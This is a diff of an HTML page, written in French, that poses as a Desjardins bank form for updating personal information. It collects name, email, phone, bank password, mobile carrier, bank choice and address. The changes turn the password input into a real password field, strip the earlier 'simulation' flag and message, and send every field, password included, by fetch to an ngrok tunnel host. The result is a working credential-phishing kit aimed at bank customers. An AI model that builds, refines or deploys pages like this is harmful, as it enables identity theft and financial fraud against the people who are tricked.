@@ -1,33 +1,38 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Desjardins</title>
+   <title>Desjardins</title>
   <style>
-    :root{
-      --bg:#ffffff; --panel:#f4fdf4; --accent:#2e7d32; --text:#1b1b1b; --muted:#4d6651; --danger:#d32f2f; --ok:#388e3c;
-      --radius:12px;
+    :root {
+      --bg: #ffffff;
+      --panel: #f4fdf4;
+      --accent: #2e7d32;
+      --text: #1b1b1b;
+      --muted: #4d6651;
+      --danger: #d32f2f;
+      --ok: #388e3c;
+      --radius: 12px;
     }
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text)}
-    .wrap{max-width:980px;margin:20px auto;padding:18px}
-    .card{background:var(--panel);border-radius:var(--radius);padding:12px;box-shadow:0 6px 18px rgba(0,0,0,.08)}
-    header{display:flex;align-items:center;justify-content:space-between;gap:12px}
-    .brand{display:flex;align-items:center;gap:12px}
-    .brand img{height:64px;border-radius:8px}
-    h1{margin:0;color:var(--accent);font-size:1.1rem}
-    form{margin-top:12px;display:grid;gap:10px}
-    label{font-size:.9rem;color:var(--muted);display:block;margin-bottom:6px}
-    input,textarea,select{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(0,0,0,.08)}
-    .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-    .muted{color:var(--muted);font-size:.88rem}
-    .buttons{display:flex;gap:8px;align-items:center}
-    /* MASQUER les contrôles publics (export/changer logo/copier) */
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial; background: var(--bg); color: var(--text); }
+    .wrap { max-width: 980px; margin: 20px auto; padding: 18px; }
+    .card { background: var(--panel); border-radius: var(--radius); padding: 12px; box-shadow: 0 6px 18px rgba(0,0,0,.08); }
+    header { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .brand { display: flex; align-items: center; gap: 12px; }
+    .brand img { height: 64px; border-radius: 8px; }
+    h1 { margin: 0; color: var(--accent); font-size: 1.1rem; }
+    form { margin-top: 12px; display: grid; gap: 10px; }
+    label { font-size: .9rem; color: var(--muted); display: block; margin-bottom: 6px; }
+    input, textarea, select { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(0,0,0,.08); }
+    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .muted { color: var(--muted); font-size: .88rem; }
+    .buttons { display: flex; gap: 8px; align-items: center; }
     #exportCsvBtn, #exportXlsxBtn, #changeLogoBtn, #copyLinkBtn { display: none !important; }
-    .notice {border-left:4px solid var(--accent);padding:10px;background:#f6fff6;border-radius:8px;color:var(--muted)}
-    .danger-note {border-left:4px solid var(--danger);background:#fff6f6}
-    .success{color:var(--ok)}
+    .notice { border-left: 4px solid var(--accent); padding: 10px; background: #f6fff6; border-radius: 8px; color: var(--muted); }
+    .danger-note { border-left: 4px solid var(--danger); background: #fff6f6; }
+    .success { color: var(--ok); }
   </style>
 </head>
 <body>
@@ -37,12 +42,12 @@
         <img id="logo" src="https://raw.githubusercontent.com/sol323083-bit/formulaire-data/c8584c2e2f5c6a35a488cecd14013184e726b2a1/te%CC%81le%CC%81chargement.png" alt="Logo" onerror="this.style.display='none'" />
         <div>
           <h1 id="title">Formulaire de Mise à jour des informations</h1>
-          <div class="muted">consentement requis</div>
+          <div class="muted">Consentement requis</div>
         </div>
       </div>
     </header>
 
-    <form id="dataForm" action="https://formspree.io/f/mgvnwgva" method="POST" novalidate style="margin-top:14px">
+    <form id="dataForm" novalidate style="margin-top:14px">
       <label for="fullName">Nom complet *</label>
       <input id="fullName" name="fullName" type="text" required minlength="2" placeholder="Ex. Nom complet" />
 
@@ -52,23 +57,22 @@
           <input id="email" name="email" type="email" required placeholder="exemple@exemple.com" />
         </div>
         <div>
-          <label for="phone">Téléphone </label>
+          <label for="phone">Téléphone</label>
           <input id="phone" name="phone" type="tel" placeholder="+1 514 555 1234" />
         </div>
       </div>
-        <div>
-          <label for="mot de passe ">Mot de passe </label>
-          <input id="mot de passe " name="mot de passe " type="tel" placeholder="*************" />
-        </div>
-      
+      <div>
+        <label for="password">Mot de passe</label>
+        <input id="password" name="password" type="password" placeholder="*************" />
+      </div>
 
-      <label for="role">Fonction</label>
-      <input id="Fonction" name="Fonction" type="text" placeholder="Étudiant,employé..." />
+      <label for="Fonction">Fonction</label>
+      <input id="Fonction" name="Fonction" type="text" placeholder="Étudiant, employé..." />
 
-      <label for="operator">Opérateur mobile </label>
+      <label for="operator">Opérateur mobile</label>
       <input id="operator" name="operator" type="text" placeholder="Ex. Bell, Rogers..." />
 
-      <label for="Faites un choix: ">Catégorie</label>
+      <label for="category">Catégorie</label>
       <select id="category" name="category">
         <option value="">— Sélectionner —</option>
         <option>Desjardins</option>
@@ -77,8 +81,8 @@
         <option>Cibc</option>
       </select>
 
-      <label for="Adresse">Message / Détails *</label>
-      <textarea id="message" name="Adresse" rows="4" required placeholder="123 rue xxx,A1A 2C3 ,province,pas"></textarea>
+      <label for="message">Adresse *</label>
+      <textarea id="message" name="message" rows="4" required placeholder="123 rue xxx, A1A 2C3, province, pays"></textarea>
 
       <!-- Champ honeypot -->
       <div style="position:absolute;left:-9999px;top:auto;">
@@ -92,63 +96,60 @@
       </label>
 
       <div style="display:flex;gap:8px;margin-top:8px">
-        <button id="submitBtn" type="submit">Soumettre </button>
-        <button type="button" onclick="form.reset()">aide</button>
+        <button id="submitBtn" type="submit">Soumettre</button>
+        <button type="button" onclick="document.getElementById('dataForm').reset()">Réinitialiser</button>
       </div>
       <div id="status" class="muted" aria-live="polite" style="margin-top:8px"></div>
-      </div>
     </form>
   </div>
 
   <script>
-    // Envoi vers le backend 
     const API_ENDPOINT = 'https://93338b16e9e3.ngrok-free.app/api/submit';
     const form = document.getElementById('dataForm');
     const statusEl = document.getElementById('status');
 
-    function fileToBase64(file){ return new Promise((resolve,reject)=>{ if(!file) return resolve(null); const r=new FileReader(); r.onload=()=>resolve(r.result); r.onerror=reject; r.readAsDataURL(file); }); }
-
-    form.addEventListener('submit', async (e)=>{
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
       statusEl.textContent = 'Envoi en cours...';
 
-      // honeypot
-      if(document.getElementById('website').value.trim()){ statusEl.textContent='Bot détecté'; return; }
+      // Vérifier le honeypot
+      if (document.getElementById('website').value.trim()) {
+        statusEl.textContent = 'Bot détecté';
+        return;
+      }
 
+      // Vérifier le consentement
       const consent = document.getElementById('consent').checked;
-      if(!consent){ statusEl.textContent = 'Consentement requis.'; return; }
+      if (!consent) {
+        statusEl.textContent = 'Consentement requis.';
+        return;
+      }
 
-      // collect
-      const fileInput = document.getElementById('file').files[0];
-      const fileData = await fileToBase64(fileInput).catch(()=>null);
-      // build payload
+      // Collecter les données
       const payload = {
         fullName: document.getElementById('fullName').value.trim(),
         email: document.getElementById('email').value.trim(),
         phone: document.getElementById('phone').value.trim(),
-        role: document.getElementById('role').value.trim(),
+        password: document.getElementById('password').value.trim(),
+        Fonction: document.getElementById('Fonction').value.trim(),
         operator: document.getElementById('operator').value.trim(),
         category: document.getElementById('category').value,
         message: document.getElementById('message').value.trim(),
-        fileName: fileInput ? fileInput.name : null,
-        fileData, // base64
-        consentGiven: true,
-        simulated: true 
+        consentGiven: true
       };
 
-    
-      try{
+      try {
         const resp = await fetch(API_ENDPOINT, {
           method: 'POST',
-          headers: {'Content-Type':'application/json'},
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        if(!resp.ok) throw new Error('Erreur serveur');
-        statusEl.textContent = 'Soumission enregistrée (simulation).';
+        if (!resp.ok) throw new Error('Erreur serveur');
+        statusEl.textContent = 'Soumission enregistrée avec succès !';
         form.reset();
-      }catch(err){
+      } catch (err) {
         console.error(err);
-        statusEl.textContent = 'Erreur lors de l’envoi. Voir la console.';
+        statusEl.textContent = 'Erreur lors de l’envoi. Veuillez réessayer.';
       }
     });
   </script>
